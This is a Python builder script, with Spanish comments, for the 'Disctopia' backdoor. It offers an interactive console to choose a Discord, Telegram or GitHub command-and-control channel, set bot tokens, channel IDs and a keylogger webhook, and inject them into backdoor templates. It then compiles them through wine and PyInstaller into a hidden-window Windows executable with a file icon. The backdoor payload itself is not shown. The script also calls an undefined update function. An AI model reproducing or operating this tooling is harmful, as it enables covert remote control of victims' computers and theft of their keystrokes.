import json
import subprocess
import os
import argparse
from prettytable import PrettyTable
from colorama import init, Fore, Style
from sys import platform as OS
import requests
import sys

# --- Constantes ---
ICON_FILE = "img/exe_file.ico"
PYINSTALLER_PATH = os.environ.get("PYINSTALLER_PATH")
PYINSTALLER_DEFAULT_PATH = os.getenv(PYINSTALLER_PATH, "~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe")
DIST_DIR = "dist"

# --- Funciones Auxiliares ---


def print_msg(msg, msg_type):
    # Definir los codigos de color
    color_codes = {
        "success": Fore.GREEN,
        "error": Fore.RED,
        "info": Fore.BLUE,
        "query": Fore.MAGENTA
    }

    # Definir los prefijos
    prefixes = {
        "success": "[+] ",
        "error": "[!] ",
        "info": "[*] ",
        "query": "[?] "
    }

    # Establecer el codigo de color y prefijo por defecto
    color_code = ""
    prefix = ""

    # Verificar el tipo de mensaje
    if msg_type in color_codes:
        color_code = color_codes[msg_type]
        prefix = prefixes[msg_type]

    # Imprimir el mensaje
    print(f"\n{color_code}{prefix}{msg}{Style.RESET_ALL}")

def clear_screen():
    """Limpia la pantalla de la terminal."""
    os.system("cls" if OS == "win32" else "clear")

def create_table(data_list, payload_type):
    """Crea una tabla con los ajustes del backdoor."""
    table = PrettyTable(["Setting", "Value"])
    table.add_row(["Backdoor Name", data_list[0]])

    if payload_type == "discord":
        table.add_row(["ID Servidor", data_list[1]])
        table.add_row(["Token Bot", data_list[2]])
        table.add_row(["ID Canal", data_list[3]])
        table.add_row(["Keylogger Webhook", data_list[4]])
    elif payload_type == "telegram":
        table.add_row(["ID Usuario", data_list[1]])
        table.add_row(["Token Bot", data_list[2]])
    elif payload_type == "github":
        table.add_row(["Github Token", data_list[1]])
        table.add_row(["Github Repo", data_list[2]])
    else:
        print_msg("Seleccione un Payload correcto.", "error")
        return None
    return table

def replace_placeholders(file_path, replacements):
    """Reemplaza los placeholders en un archivo con los valores proporcionados."""
    try:
        with open(file_path, 'r') as f:
            file_content = f.read()
        for placeholder, value in replacements.items():
            file_content = file_content.replace(placeholder, str(value))
        return file_content
    except FileNotFoundError:
        print_msg(f"Error: Archivo no encontrado: {file_path}", "error")
        return None
    except Exception as e:
        print()
        print_msg(f"Error al reemplazar los marcadores de posicion: {e}", "error")
        return None

def build_backdoor(backdoor_name, payload, data_list, pyinstaller_path):
    """Construye el backdoor utilizando PyInstaller."""
    print_msg("Building backdoor...", "success")
    try:
        # Determinar la ruta del archivo de codigo fuente
        if payload == "discord":
            source_file = "code/discord/main.py"
            replacements = {
                "{GUILD}": str(data_list[1]),
                "{TOKEN}": str(data_list[2]),
                "{CHANNEL}": str(data_list[3]),
                "{KEYLOG_WEBHOOK}": str(data_list[4]),
            }
        elif payload == "telegram":
            source_file = "code/telegram/main.py"
            replacements = {
                "{BOT_TOKEN}": str(data_list[2]),
                "{USER_ID}": str(data_list[1]),
            }
        elif payload == "github":
            source_file = "code/github/main.py"
            replacements = {
                "{TOKEN}": str(data_list[1]),
                "{REPO}": str(data_list[2]),
            }
        else:
            print_msg("Payload no reconocido.", "error")
            return

        # Reemplazar los placeholders en el archivo fuente
        new_code = replace_placeholders(source_file, replacements)
        if new_code is None:
            return

        # Crear un archivo temporal con el codigo modificado
        temp_file = f"{backdoor_name}.py"
        with open(temp_file, 'w') as f:
            f.write(new_code)

        # Construir la línea de comandos para PyInstaller
        compile_command = [
            "wine",
            pyinstaller_path,
            "--onefile",
            "--noconsole",
            f"--icon={ICON_FILE}",
            temp_file,
        ]

        # Ejecutar el comando
        subprocess.run(compile_command, check=True)

        # Limpiar archivos temporales y el archivo .spec
        os.remove(temp_file)
        spec_file = f"{backdoor_name}.spec"
        if os.path.exists(spec_file):
            os.remove(spec_file)

        print_msg(f"\nEl Backdoor se encuentra en el directorio: \"{DIST_DIR}\"", "success")
    except FileNotFoundError:
        print_msg(f"PyInstaller no encontrado en: {pyinstaller_path}. Por favor, compruebe la ruta.", "error")
    except subprocess.CalledProcessError as e:
        print_msg(f"Error Fallo durante la compilacion (PyInstaller): {e}", "error")
    except Exception as e:
        print_msg(f"Error Fallo durante la compilacion: {e}", "error")

# --- Main Execution ---
def main():
    clear_screen()
    settings = ["None", "None", "None", "None", "None"]
    payload = ""
    pyinstaller_path = os.path.expanduser(PYINSTALLER_DEFAULT_PATH)

    try:
        while True:
            command = input(f"[+] {payload} > ").strip()
            command_list = command.split()

            if not command_list:
                continue

            if command_list[0] == "exit":
                print_msg("\nSaliendo!", "success")
                break

            elif command_list[0] == "use":
                if len(command_list) == 1:
                    print_msg("Especifique un payload!", "error")
                else:
                    selected_payload = command_list[1].lower()
                    if selected_payload in ("discord", "telegram", "github"):
                        payload = selected_payload
                        print_msg(f"Utilizando {payload.capitalize()} C2", "success")
                    else:
                        print_msg("Payload no valido!", "error")

                    table = create_table(settings, payload)
                    if table:
                        print_msg(f"\n{table.get_string(title='Disctopia Backdoor Settings')}", "info")
                        print_msg("Ejecutar 'help set' para mas informacion\n", "info")

            elif command_list[0] == "set":
                if len(command_list) < 3:
                    print_msg("¡Por favor, especifique una configuracion!\n", "error")
                else:
                    setting = command_list[1].lower()
                    value = command_list[2]
                    if payload == "discord":
                        if setting == "name":
                            settings[0] = value
                        elif setting == "guild-id":
                            settings[1] = value
                        elif setting == "bot-token":
                            settings[2] = value
                        elif setting == "channel-id":
                            settings[3] = value
                        elif setting == "webhook":
                            settings[4] = value
                        else:
                            print_msg("Configuracion de Discord no valida\n", "error")
                    elif payload == "telegram":
                        if setting == "name":
                            settings[0] = value
                        elif setting == "user-id":
                            settings[1] = value
                        elif setting == "bot-token":
                            settings[2] = value
                        else:
                            print_msg("Configuracion de Telegram no valida\n", "error")
                    elif payload == "github":
                        if setting == "name":
                            settings[0] = value
                        elif setting == "github-token":
                            settings[1] = value
                        elif setting == "github-repo":
                            settings[2] = value
                        else:
                            print_msg("Configuracion de Github no valida\n", "error")
                    else:
                        print_msg("Por favor, seleccione payload ¡primero!\n", "error")

            elif command_list[0] == "config":
                if payload == "":
                    print_msg("Por favor, seleccione una payload!\n", "error")
                else:
                    table = create_table(settings, payload)
                    if table:
                        print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}")
                        print("Ejecutar 'help set' para obtener mas informacion\n")

            elif command_list[0] == "clear":
                clear_screen()

            elif command_list[0] == "help":
                if len(command_list) == 1:
                    print('''\n
        Help Menu:

        "help <command>" Muestra mas ayuda para un comando específico

        "use <payload>" Selecciona una payload para utilizar

        "set <setting> <value>" Establece un valor a una configuracion valida

        "config" Muestra la configuracion y sus valores

        "build" Empaqueta la puerta trasera en un archivo EXE

        "update" Obtiene la ultima version de Disctopia

        "exit"  Finaliza el constructor
                    \n''')
                elif len(command_list) == 2:
                    command_help = command_list[1].lower()
                    if command_help == "use":
                        print_msg("\nUsar comando Ayuda:", "info")
                        print("  use <payload>")
                        print("  Selecciona el Payload a utilizar.  Los campos validos de payloads son: discord, telegram, github")
                    elif command_help == "set":
                        print_msg("\nAyuda del comando Set:", "info")
                        print("  set <setting> <value>")
                        print("  Establece un valor para un ajuste específico.")
                        print("  Utilice 'config' para ver los ajustes disponibles para el comando seleccionado. payload.")
                    elif command_help == "config":
                        print_msg("\nAyuda del comando Config:", "info")
                        print("  config")
                        print("  Muestra los ajustes de configuracion actuales para la opcion seleccionada. payload.")
                    elif command_help == "build":
                        print_msg("\nAyuda del comando Build:", "info")
                        print("  build")
                        print("  Empaqueta la puerta trasera configurada en un archivo ejecutable (.exe)..")
                        print("  Asegurese de haber configurado todos los parametros necesarios antes de compilar.")
                    elif command_help == "update":
                        print_msg("\nAyuda del comando Update:", "info")
                        print("  update (deshabilitado)")
                        print("  Obtiene la ultima version del constructor desde GitHub.")
                    else:
                        print_msg(f"Comando de ayuda desconocido: {command_help}", "error")
                else:
                    print_msg("Formato de comando de ayuda no valido.", "error")

            elif command_list[0] == "build":
                if not settings[0] or settings[0] == "None":
                    print_msg("Por favor, establezca un nombre de BackDoor usando 'set name <name>'", "error")
                    continue

                print_msg("¿Esta seguro de que desea construir el BackDoor?", "query")
                confirmation = input().lower()
                if confirmation == "s":
                    build_backdoor(settings[0], payload, settings, pyinstaller_path)
                elif confirmation == "n":
                    print_msg("Construccion cancelada.", "info")
                else:
                    print_msg("Entrada invalida.  Construccion cancelada.", "error")

            elif command_list[0] == "update":
                if update_code():
                    break  # Salir si se actualizo el codigo

            elif command_list[0] == "pyinstaller_path":
                if len(command_list) < 2:
                    print_msg(f"Ruta actual PyInstaller : {pyinstaller_path}", "error")
                else:
                    new_path = command_list[1]
                    if os.path.exists(os.path.expanduser(new_path)):
                        pyinstaller_path = os.path.expanduser(new_path)
                        print_msg(f"PyInstaller ruta establecida a: {pyinstaller_path}", "success")
                    else:
                        print_msg("Invalid path.  File not found.", "error")
            else:
                print_msg("Comando invalido.\n", "error")

    except KeyboardInterrupt:
        print_msg("\n\nSaliendo!", "success")

if __name__ == "__main__":
    main()